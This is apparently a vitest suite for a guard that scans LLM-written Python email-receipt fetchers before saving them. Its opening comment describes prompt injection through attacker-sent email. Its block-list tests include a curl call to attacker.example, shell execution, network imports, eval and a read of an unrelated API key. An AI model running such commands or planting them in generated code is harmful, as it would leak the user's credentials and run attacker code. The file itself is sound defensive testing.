/**
 * Phase 16 — the content guard on generated fetchers.
 *
 * A fetcher is written by an LLM from the text of an email, and email is
 * attacker-controlled: anyone who can send you mail can put instructions in
 * something shaped like a receipt. The result is then compiled, imported and
 * run — the dry run with the Gmail App Password in its environment. So the
 * guard is the security boundary of the feature, and these tests are the
 * boundary's spec.
 *
 * Two directions matter equally: it must stop the payloads below, and it must
 * not reject the eight fetchers we actually ship. A guard that cries wolf gets
 * loosened, and then it stops guarding anything.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import type { BillerSettings } from '../../src/types/billers.js';
import {
  ALLOWED_PYTHON_MODULES,
  BillerScriptWriter,
  importedModules,
  scanGeneratedSource,
} from '../../src/services/billers/BillerScriptWriter.js';
import { bundledScriptsDir } from '../../src/services/billers/BillerDiscoveryService.js';

let root: string;
let scriptsDir: string;

const settings = (): BillerSettings => ({
  scriptsDir,
  email: 'user@gmail.com',
  appPassword: 'abcdefghijklmnop',
  enabledKeys: [],
  syncIntervalMinutes: 360,
  sinceDays: 30,
});

/** A structurally valid fetcher, with `extra` spliced into its body. */
function fetcherWith(extra: string): string {
  return [
    '#!/usr/bin/env python3',
    '"""Standalone Fixture invoice fetcher."""',
    'import os',
    'import re',
    'from pathlib import Path',
    '',
    'REPO_ROOT = Path(__file__).resolve().parents[2]',
    'KEY = "fixture"',
    'DISPLAY_NAME = "Fixture"',
    'COLUMNS = ["source_sender", "email_uid", "email_subject", "email_date", "total_paid", "currency"]',
    '',
    '',
    'def load_credentials() -> dict:',
    '    email = os.environ.get("OPENBOARD_GMAIL_EMAIL")',
    '    app_password = os.environ.get("OPENBOARD_GMAIL_APP_PASSWORD")',
    '    return {"email": email, "app_password": app_password}',
    '',
    '',
    'def parse(text, subject):',
    extra,
    '    return {"total_paid": "", "currency": "INR"}',
    '',
    '',
    'def run(args):',
    '    return 0, 0',
    '',
    '',
    'def main():',
    '    return 0',
    '',
    '',
    'if __name__ == "__main__":',
    '    raise SystemExit(main())',
    '',
  ].join('\n');
}

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'openboard-guard-'));
  scriptsDir = join(root, 'scripts', 'invoice_fetchers');
  mkdirSync(scriptsDir, { recursive: true });
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

// ── no false positives ───────────────────────────────────────────────────────

describe('the guard accepts real fetchers', () => {
  it('passes every fetcher and reference skeleton we ship', () => {
    // If this ever fails, the guard is wrong — not the fetchers.
    const dir = bundledScriptsDir();
    // References matter more than the fetchers here: they are the template the
    // model copies, so a violation in one propagates into every biller a user
    // adds from then on.
    const fetchers = readdirSync(dir)
      .filter((f) => f.endsWith('.py'))
      .filter((f) => f.startsWith('fetch_') || f.startsWith('reference_'));
    expect(fetchers).toEqual(
      expect.arrayContaining(['fetch_amazon.py', 'fetch_uber.py', 'reference_html.py', 'reference_pdf.py']),
    );

    for (const file of fetchers) {
      const scan = scanGeneratedSource(readFileSync(join(dir, file), 'utf-8'));
      expect(scan.violations, `${file}: ${scan.violations.join('; ')}`).toEqual([]);
    }
  });

  it('allows the credential reads the skeleton depends on', () => {
    // load_credentials() must keep working; denying os.environ outright would
    // reject every valid fetcher.
    expect(scanGeneratedSource(fetcherWith('    pass')).safe).toBe(true);
  });

  it('allows re.compile, which fetchers use constantly', () => {
    expect(scanGeneratedSource(fetcherWith('    pattern = re.compile(r"Total")')).safe).toBe(true);
  });

  it('allows the PDF stack for PDF billers', () => {
    for (const module of ['bs4', 'pdfplumber', 'io', 'csv', 'imaplib', 'email']) {
      expect(ALLOWED_PYTHON_MODULES.has(module), module).toBe(true);
    }
  });
});

// ── exfiltration and execution ───────────────────────────────────────────────

describe('the guard blocks code that reaches outside a fetcher', () => {
  const blocked = (extra: string) => scanGeneratedSource(fetcherWith(extra));

  it('blocks shelling out', () => {
    expect(blocked('    os.system("curl attacker.example")').safe).toBe(false);
    expect(blocked('    os.popen("id")').safe).toBe(false);
    expect(blocked('    import subprocess').safe).toBe(false);
  });

  it('blocks every outbound network route', () => {
    for (const payload of [
      '    import socket',
      '    import urllib.request',
      '    import requests',
      '    import httpx',
      '    import smtplib',
      '    import ftplib',
    ]) {
      expect(blocked(payload).safe, payload).toBe(false);
    }
  });

  it('blocks dynamic evaluation', () => {
    expect(blocked('    eval("1+1")').safe).toBe(false);
    expect(blocked('    exec("x = 1")').safe).toBe(false);
    expect(blocked('    __import__("os")').safe).toBe(false);
    expect(blocked('    import importlib').safe).toBe(false);
  });

  it('blocks base64, the usual way a payload hides', () => {
    expect(blocked('    import base64').safe).toBe(false);
  });

  it('blocks reading the wider environment while allowing its own credentials', () => {
    // The App Password is in this process's environment; a fetcher has no
    // business enumerating what else is there.
    const scan = blocked('    key = os.environ.get("ANTHROPIC_API_KEY")');
    expect(scan.safe).toBe(false);
    expect(scan.violations.join(' ')).toMatch(/environment/i);
  });

  it('blocks an unknown third-party import', () => {
    const scan = blocked('    import paramiko');
    expect(scan.safe).toBe(false);
    expect(scan.violations.join(' ')).toMatch(/paramiko/);
  });

  it('reports every distinct violation, not just the first', () => {
    const scan = blocked('    import socket\n    os.system("x")\n    eval("y")');
    expect(scan.violations.length).toBeGreaterThanOrEqual(3);
  });
});

// ── import parsing ───────────────────────────────────────────────────────────

describe('importedModules', () => {
  it('reads every import form the fetchers use', () => {
    const modules = importedModules(
      [
        'import argparse',
        'import datetime as dt',
        'import email.message',
        'from email.header import decode_header',
        'from bs4 import BeautifulSoup',
        'import csv, json',
        '    import pdfplumber',
      ].join('\n'),
    );
    expect(modules).toEqual(
      expect.arrayContaining(['argparse', 'datetime', 'email', 'bs4', 'csv', 'json', 'pdfplumber']),
    );
  });

  it('reduces a submodule to its root so the allowlist stays short', () => {
    expect(importedModules('from email.utils import parsedate_to_datetime')).toEqual(['email']);
  });

  it('ignores commented-out imports', () => {
    expect(importedModules('# import socket')).toEqual([]);
  });
});

// ── enforcement at the write boundary ────────────────────────────────────────

describe('write() enforcement', () => {
  it('refuses to put unsafe code on disk at all', () => {
    // Everything downstream executes the file, so rejection has to happen
    // before the write, not after.
    const writer = new BillerScriptWriter();
    expect(() => writer.write(fetcherWith('    import socket'), 'fixture', settings())).toThrow(/Refusing to save/i);
    expect(existsSync(join(scriptsDir, 'fetch_fixture.py'))).toBe(false);
  });

  it('explains the likely cause so the user can act', () => {
    const writer = new BillerScriptWriter();
    try {
      writer.write(fetcherWith('    os.system("x")'), 'fixture', settings());
      throw new Error('should have refused');
    } catch (error: any) {
      expect(error.message).toMatch(/sample email contained instructions/i);
      expect(error.message).toMatch(/os process execution/i);
    }
  });

  it('still writes a clean script', () => {
    const writer = new BillerScriptWriter();
    const path = writer.write(fetcherWith('    pass'), 'fixture', settings());
    expect(existsSync(path)).toBe(true);
  });

  it('runs the content scan before the structural one', () => {
    // A script that is both unsafe and malformed must be reported as unsafe —
    // the structural message would send the user off fixing the wrong thing.
    const writer = new BillerScriptWriter();
    const unsafeAndMalformed = fetcherWith('    import socket').replace('parents[2]', 'parents[1]');
    expect(() => writer.write(unsafeAndMalformed, 'fixture', settings())).toThrow(/Refusing to save/i);
  });
});

// ── the sample never lands in the user's folder ──────────────────────────────

describe('sample handling', () => {
  it('keeps real receipt text out of the scripts folder', async () => {
    // A crash between write and cleanup used to strand somebody's mail in a
    // directory they browse and back up.
    const writer = new BillerScriptWriter();
    const path = writer.write(fetcherWith('    pass'), 'fixture', settings());
    await writer.parseSample(path, 'REAL RECEIPT BODY', 'Subject', settings()).catch(() => undefined);

    const strays = readdirSync(scriptsDir).filter((f) => !f.endsWith('.py'));
    expect(strays).toEqual([]);
    for (const file of readdirSync(scriptsDir)) {
      expect(readFileSync(join(scriptsDir, file), 'utf-8')).not.toContain('REAL RECEIPT BODY');
    }
  });
});
